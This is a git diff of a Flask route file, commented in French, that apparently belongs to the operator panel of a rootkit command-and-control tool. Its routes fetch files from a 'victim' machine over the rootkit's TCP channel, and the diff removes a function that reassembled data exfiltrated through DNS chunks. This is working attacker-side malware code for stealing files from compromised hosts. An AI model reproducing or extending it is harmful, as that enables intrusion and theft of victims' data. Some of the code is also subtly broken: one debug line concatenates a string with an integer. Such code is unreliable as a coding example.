@@ -1,10 +1,9 @@
 from app import app
 import config as cfg
 from flask import render_template, redirect, url_for, request, flash
-import os, time
-from utils.server import TCPServer
-
+import os
 # --------------------------------- LISTE DES FICHIERS --------------------------------- #
+
 
 @app.route('/download')
 def download():
@@ -13,6 +12,7 @@ def download():
     return render_template("download.html", files=files)
 
 # ---------------------- TÉLÉCHARGER UN FICHIER DEPUIS LA VICTIME ---------------------- #
+
 
 @app.route('/download-remote', methods=['POST'])
 def download_remote():
@@ -23,7 +23,7 @@ def download_remote():
     try:
         # 1. Demande le fichier
         print(f"Envoi commande : download " + remote_path)
-        response = cfg.rootkit_connexion.send_to_client(f"download {remote_path}")
+        response = cfg.rootkit_connexion.send(f"download {remote_path}", use_history=False, channel="tcp")
         if not response or not response.startswith("SIZE "):
             flash(f"❌ Fichier indisponible ou erreur : {response}", "error")
             return redirect(url_for('download'))
@@ -32,12 +32,12 @@ def download_remote():
         size = int(response.split()[1])
         print(f"[DEBUG] Taille du fichier : " + size)
         print(f"[DEBUG] Envoi READY")
-        cfg.rootkit_connexion.send_to_client("READY")
+        cfg.rootkit_connexion.send("READY", use_history=False, channel="tcp")
 
         # 3. Réception
         print(f"[DEBUG] Reception data")
-        data = cfg.rootkit_connexion._network_handler.receive(
-            cfg.rootkit_connexion._client_socket
+        data = cfg.rootkit_connexion.get_tcp_object()._network_handler.receive(
+            cfg.rootkit_connexion.get_tcp_object()._client_socket
         )
 
         # 🔍 Correction ici : tester explicitement les échecs
@@ -62,31 +62,3 @@ def download_remote():
     except Exception as e:
         flash(f"❌ Erreur pendant le téléchargement : {e}", "error")
         return redirect(url_for('download'))
-
-# --------------------------- EXFIL ASSEMBLY (DNS) --------------------------- #
-
-def assemble_exfil(timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL):
-    """
-    Attend jusqu'à `timeout` secondes pour recevoir tous les chunks DNS
-    puis assemble les données exfiltrées.
-    """
-
-    start = time.time()
-
-    while True:
-        if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
-            break
-        if time.time() - start > timeout:
-            break
-        time.sleep(poll)
-
-    if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
-        data = b''.join(cfg.exfil_buffer[i] for i in range(cfg.expected_chunks))
-        text = data.decode(errors='ignore')
-    else:
-        text = ""
-
-    # Reset buffers
-    cfg.expected_chunks = None
-    cfg.exfil_buffer.clear()
-    return text
